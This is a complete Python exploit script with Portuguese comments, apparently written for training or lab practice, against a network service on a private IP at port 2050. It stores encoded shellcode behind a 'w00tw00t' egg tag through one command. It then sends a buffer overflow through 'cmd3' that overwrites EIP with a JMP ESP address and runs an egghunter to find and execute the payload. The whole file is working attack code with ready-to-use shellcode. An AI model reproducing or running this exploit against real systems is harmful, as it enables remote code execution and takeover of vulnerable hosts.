#!/usr/bin/python
# -*- coding: UTF-8 -*-
# Autor: 1º Ten Chitolina - 0x4rt3mis

import socket
import struct

IP = "192.168.122.49"
PORT = 2050

egghunter = b"\x66\x81\xca\xff\x0f\x42\x52\x31\xc0\x66\x05\xc6\x01\xcd\x2e\x3c\x05\x5a\x74\xec\xb8\x77\x30\x30\x74\x89\xd7\xaf\x75\xe7\xaf\x75\xe4\xff\xe7"

# 1º Estágio
shellcode = b'w00tw00t'
shellcode += b"\x90" * 10                                                                                                                                                                  
shellcode += b"\xbb\x43\x59\xd7\xa3\xda\xc6\xd9\x74\x24\xf4"                                                                                                                                 
shellcode += b"\x5a\x2b\xc9\xb1\x52\x83\xea\xfc\x31\x5a\x0e"                                  
shellcode += b"\x03\x19\x57\x35\x56\x61\x8f\x3b\x99\x99\x50"                                  
shellcode += b"\x5c\x13\x7c\x61\x5c\x47\xf5\xd2\x6c\x03\x5b"                                  
shellcode += b"\xdf\x07\x41\x4f\x54\x65\x4e\x60\xdd\xc0\xa8"                                  
shellcode += b"\x4f\xde\x79\x88\xce\x5c\x80\xdd\x30\x5c\x4b"                                  
shellcode += b"\x10\x31\x99\xb6\xd9\x63\x72\xbc\x4c\x93\xf7"                                  
shellcode += b"\x88\x4c\x18\x4b\x1c\xd5\xfd\x1c\x1f\xf4\x50"                                                                                                                                 
shellcode += b"\x16\x46\xd6\x53\xfb\xf2\x5f\x4b\x18\x3e\x29"                                                                                                                                 
shellcode += b"\xe0\xea\xb4\xa8\x20\x23\x34\x06\x0d\x8b\xc7"                                  
shellcode += b"\x56\x4a\x2c\x38\x2d\xa2\x4e\xc5\x36\x71\x2c"                                  
shellcode += b"\x11\xb2\x61\x96\xd2\x64\x4d\x26\x36\xf2\x06"                                  
shellcode += b"\x24\xf3\x70\x40\x29\x02\x54\xfb\x55\x8f\x5b"                                  
shellcode += b"\x2b\xdc\xcb\x7f\xef\x84\x88\x1e\xb6\x60\x7e"                                  
shellcode += b"\x1e\xa8\xca\xdf\xba\xa3\xe7\x34\xb7\xee\x6f"                                  
shellcode += b"\xf8\xfa\x10\x70\x96\x8d\x63\x42\x39\x26\xeb"                                  
shellcode += b"\xee\xb2\xe0\xec\x11\xe9\x55\x62\xec\x12\xa6"                                  
shellcode += b"\xab\x2b\x46\xf6\xc3\x9a\xe7\x9d\x13\x22\x32"                                  
shellcode += b"\x31\x43\x8c\xed\xf2\x33\x6c\x5e\x9b\x59\x63"                                  
shellcode += b"\x81\xbb\x62\xa9\xaa\x56\x99\x3a\x15\x0e\xdb"                                  
shellcode += b"\xcf\xfd\x4d\x1b\x31\x45\xd8\xfd\x5b\xa9\x8d"
shellcode += b"\x56\xf4\x50\x94\x2c\x65\x9c\x02\x49\xa5\x16"
shellcode += b"\xa1\xae\x68\xdf\xcc\xbc\x1d\x2f\x9b\x9e\x88"
shellcode += b"\x30\x31\xb6\x57\xa2\xde\x46\x11\xdf\x48\x11"
shellcode += b"\x76\x11\x81\xf7\x6a\x08\x3b\xe5\x76\xcc\x04"
shellcode += b"\xad\xac\x2d\x8a\x2c\x20\x09\xa8\x3e\xfc\x92"
shellcode += b"\xf4\x6a\x50\xc5\xa2\xc4\x16\xbf\x04\xbe\xc0"
shellcode += b"\x6c\xcf\x56\x94\x5e\xd0\x20\x99\x8a\xa6\xcc"
shellcode += b"\x28\x63\xff\xf3\x85\xe3\xf7\x8c\xfb\x93\xf8"
shellcode += b"\x47\xb8\xb4\x1a\x4d\xb5\x5c\x83\x04\x74\x01"
shellcode += b"\x34\xf3\xbb\x3c\xb7\xf1\x43\xbb\xa7\x70\x41"
shellcode += b"\x87\x6f\x69\x3b\x98\x05\x8d\xe8\x99\x0f"


# 2º Estágio
payload = 3000 # Tamanho do Buffer
buffer = b"A" * 48 
buffer += struct.pack('<I', 0x6250129f) # EIP - JMP ESP - 0x6250129f
buffer += b"\x90" * 2
buffer += egghunter
buffer += b"C" * (payload - len(buffer))

# Envio do Primeiro Estágio
print(b"Enviando payload no comando ajuda")
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect((IP, PORT))
r = s.recv(1024)
print(r)
s.send(b"sair " + shellcode + b"\r\n")
s.close()

# Envio do Segundo Estágio
print(b"Enviando payload no comando cmd3")
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect((IP, PORT))
r = s.recv(1024)
print(r)
s.send(b"cmd3 /.:/" + buffer + b"\r\n")
s.close()
